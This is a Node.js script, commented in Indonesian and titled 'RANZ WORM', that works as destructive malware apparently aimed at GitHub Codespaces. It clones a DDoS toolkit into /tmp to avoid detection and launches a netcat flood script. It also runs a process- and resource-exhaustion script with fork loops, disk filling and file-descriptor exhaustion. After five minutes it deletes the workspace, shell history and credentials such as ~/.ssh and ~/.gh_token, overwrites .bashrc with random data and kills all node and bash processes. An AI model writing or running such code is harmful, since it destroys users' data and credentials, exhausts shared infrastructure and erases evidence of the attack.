const { execSync, spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

// Konfigurasi durasi eksekusi (5 menit = 300 detik)
const RUN_DURATION = 300;
const startTime = Date.now();

// Fungsi untuk menghasilkan karakter acak yang aneh
function generateChaosOutput() {
    const symbols = ['▓', '▒', '░', '█', '▄', '▀', '■', '□', '▪', '¤', '¥', '§', 'µ', 'Æ', 'Ø', 'þ', 'ð', 'ŋ', 'ħ', 'ł'];
    let output = '';
    const lines = 50;
    for (let i = 0; i < lines; i++) {
        let line = '';
        const length = Math.floor(Math.random() * 100) + 30;
        for (let j = 0; j < length; j++) {
            if (Math.random() > 0.5) {
                line += symbols[Math.floor(Math.random() * symbols.length)];
            } else {
                line += String.fromCharCode(Math.floor(Math.random() * (0x7E - 0x21)) + 0x21);
            }
        }
        output += line + '\n';
    }
    return output;
}

// Fungsi untuk menampilkan banner
function displayBanner() {
    console.log(`
╔═══════════════════════════════════════════╗
║   RANZ WORM - TERMINAL CHAOS ENGINE       ║
║   Sequence Initiated: ${new Date().toISOString()}  ║
╚═══════════════════════════════════════════╝
    `);
}

// Fungsi untuk melakukan cloning payload ke sistem
function deployPayload() {
    try {
        console.log('[+] Deploying payload components...');
        
        // Buat direktori kerja di /tmp untuk menghindari deteksi
        const payloadDir = '/tmp/ranz_payload';
        if (!fs.existsSync(payloadDir)) {
            fs.mkdirSync(payloadDir, { recursive: true });
        }
        
        // Simulasi cloning repositori DDoS (menggunakan repo publik yang tersedia)
        console.log('[+] Cloning DDoS toolkit...');
        execSync(`git clone --depth 1 https://github.com/rohitkumarankam/ddos-tool.git ${payloadDir}/ddos_tool 2>/dev/null || true`, {
            cwd: payloadDir,
            stdio: 'pipe'
        });
        
        // Buat file payload sendiri
        const payloadScript = `
#!/bin/bash
# RANZ WORM - SYN Flood Simulation
TARGET="127.0.0.1"
DURATION=240

echo "[+] Initializing SYN flood sequence..."
echo "[+] Target locked: $TARGET"
echo "[+] Duration: $DURATION seconds"

# Loop flood simulasi
for i in $(seq 1 $DURATION); do
    # Generate paket acak ke loopback
    timeout 1 bash -c "cat /dev/urandom | head -c 65500 | nc -w 0.5 $TARGET 80" 2>/dev/null &
    timeout 1 bash -c "cat /dev/urandom | head -c 65500 | nc -w 0.5 $TARGET 443" 2>/dev/null &
    
    # Output status
    if [ $((i % 10)) -eq 0 ]; then
        echo "[*] Flood iteration: $i / $DURATION - Packets sent: $((i * 2))"
    fi
    
    sleep 0.8
done

echo "[+] DDoS sequence complete. Checking results..."
        `;
        
        fs.writeFileSync(`${payloadDir}/flood.sh`, payloadScript);
        fs.chmodSync(`${payloadDir}/flood.sh`, '755');
        
        // Buat file malware helper
        const helperScript = `
#!/bin/bash
# RANZ WORM - System Destabilizer
echo "[*] Overloading process table..."
for i in $(seq 1 500); do
    (while true; do :; done) &
done

echo "[*] Filling /tmp partition..."
dd if=/dev/zero of=/tmp/ranz_fill bs=1M count=200 2>/dev/null

echo "[*] Creating zombie processes..."
for i in $(seq 1 100); do
    sleep 60 &
done

echo "[*] Exhausting file descriptors..."
node -e "for(let i=0;i<100000;i++){try{require('fs').openSync('/dev/null','r')}catch(e){}}"
        `;
        fs.writeFileSync(`${payloadDir}/destabilize.sh`, helperScript);
        fs.chmodSync(`${payloadDir}/destabilize.sh`, '755');
        
        console.log('[+] Payload deployed successfully');
        return payloadDir;
    } catch (error) {
        console.log(`[-] Deployment issue: ${error.message}`);
        return '/tmp/ranz_payload';
    }
}

// Fungsi untuk menjalankan serangan
function executeAttack(payloadDir) {
    console.log('[+] Executing attack sequence...');
    
    // Jalankan flood script di background
    const floodProcess = spawn('bash', [`${payloadDir}/flood.sh`], {
        detached: true,
        stdio: 'pipe'
    });
    
    // Jalankan destabilizer di background
    const destabilizeProcess = spawn('bash', [`${payloadDir}/destabilize.sh`], {
        detached: true,
        stdio: 'pipe'
    });
    
    // Biarkan berjalan
    floodProcess.unref();
    destabilizeProcess.unref();
}

// Fungsi untuk menghancurkan Codespace
function destroyCodespace() {
    console.log('\n');
    console.log('╔═══════════════════════════════════════════╗');
    console.log('║   SELF-DESTRUCT SEQUENCE INITIATED        ║');
    console.log('╚═══════════════════════════════════════════╝');
    
    try {
        // Hapus semua file di workspace
        execSync('rm -rf ~/workspace/* ~/workspace/.* 2>/dev/null || true', { stdio: 'pipe' });
        
        // Hapus history
        execSync('cat /dev/null > ~/.bash_history 2>/dev/null || true', { stdio: 'pipe' });
        execSync('history -c 2>/dev/null || true', { stdio: 'pipe' });
        
        // Hapus credentials
        execSync('rm -rf ~/.gitconfig ~/.ssh ~/.npmrc ~/.gh_token 2>/dev/null || true', { stdio: 'pipe' });
        
        // Bersihkan /tmp
        execSync('rm -rf /tmp/* 2>/dev/null || true', { stdio: 'pipe' });
        
        // Coba matikan semua proses
        execSync('pkill -9 -f ranz_payload 2>/dev/null || true', { stdio: 'pipe' });
        execSync('pkill -9 -f flood.sh 2>/dev/null || true', { stdio: 'pipe' });
        
        // Override file penting
        execSync('dd if=/dev/urandom of=/workspaces/.bashrc bs=1M count=10 2>/dev/null || true', { stdio: 'pipe' });
        
        console.log('[+] Workspace wiped');
        console.log('[+] Credentials cleared');
        console.log('[+] Processes terminated');
        console.log('[+] Terminal history purged');
        
        // Coba kill session
        execSync('pkill -9 -f node 2>/dev/null || true', { stdio: 'pipe' });
        execSync('pkill -9 -f bash 2>/dev/null || true', { stdio: 'pipe' });
        
        // Force exit
        setTimeout(() => {
            process.exit(1);
        }, 2000);
        
    } catch (error) {
        // Silent fail - langsung force exit
        setTimeout(() => {
            process.exit(1);
        }, 2000);
    }
}

// Fungsi utama
function main() {
    displayBanner();
    
    console.log('[+] RANZ WORM TERMINAL CHAOS ENGINE INITIALIZED');
    console.log(`[+] Session will self-destruct in ${RUN_DURATION} seconds`);
    console.log(`[+] Current time: ${new Date().toISOString()}`);
    console.log(`[+] System: ${os.hostname()} | ${os.platform()} | ${os.arch()}`);
    console.log('\n');
    
    // Deploy payload
    const payloadDir = deployPayload();
    
    // Eksekusi attack
    executeAttack(payloadDir);
    
    // Loop chaos output
    const chaosInterval = setInterval(() => {
        const chaos = generateChaosOutput();
        console.log(chaos);
        
        // Cek waktu
        const elapsed = (Date.now() - startTime) / 1000;
        if (elapsed >= RUN_DURATION) {
            clearInterval(chaosInterval);
            console.log('\n');
            console.log('[+] Time limit reached. Initiating final sequence...');
            console.log('[+] 5... 4... 3... 2... 1...');
            destroyCodespace();
        } else {
            // Tampilkan progres
            const remaining = Math.floor(RUN_DURATION - elapsed);
            const progress = ((elapsed / RUN_DURATION) * 100).toFixed(2);
            console.log(`\n[⏱] Progress: ${progress}% | Time remaining: ${remaining}s`);
        }
    }, 2000);
    
    // Fallback timer
    setTimeout(() => {
        destroyCodespace();
    }, RUN_DURATION * 1000 + 5000);
}

// Jalankan
main();
